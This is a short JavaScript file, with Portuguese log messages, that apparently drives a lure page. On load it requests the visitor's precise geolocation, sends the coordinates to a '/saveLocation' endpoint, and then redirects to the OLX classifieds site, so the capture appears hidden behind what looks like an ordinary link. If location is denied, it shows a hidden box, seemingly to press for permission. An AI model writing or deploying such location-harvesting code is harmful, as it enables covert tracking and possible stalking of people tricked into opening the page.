
document.addEventListener('DOMContentLoaded', () => {
    const box = document.querySelector('.box');
    
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            saveLocation, 
            (error) => errorSaveLocation(box),
            options
        );
    } else {
        console.log('Erro ao obter localização');
    }
});

const options = {
    enableHighAccuracy: true,
    timeout: 5000
};

function saveLocation(position) {
    const { latitude, longitude } = position.coords;
    
    
    const latitudeString = latitude.toString();
    const longitudeString = longitude.toString();

    fetch('/saveLocation', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            latitude: latitudeString, 
            longitude: longitudeString, 
        }),
    })
    .then((response) => response.json())
    .then((data) => {
        
        window.location.href = 'https://www.olx.com.br/'
        console.log('Localização salva:', data);
    })
    .catch((error) => {
        console.error('Erro ao salvar a localização:', error);
    });
}

function errorSaveLocation(box) {
    box.style.display = 'block'
    
}

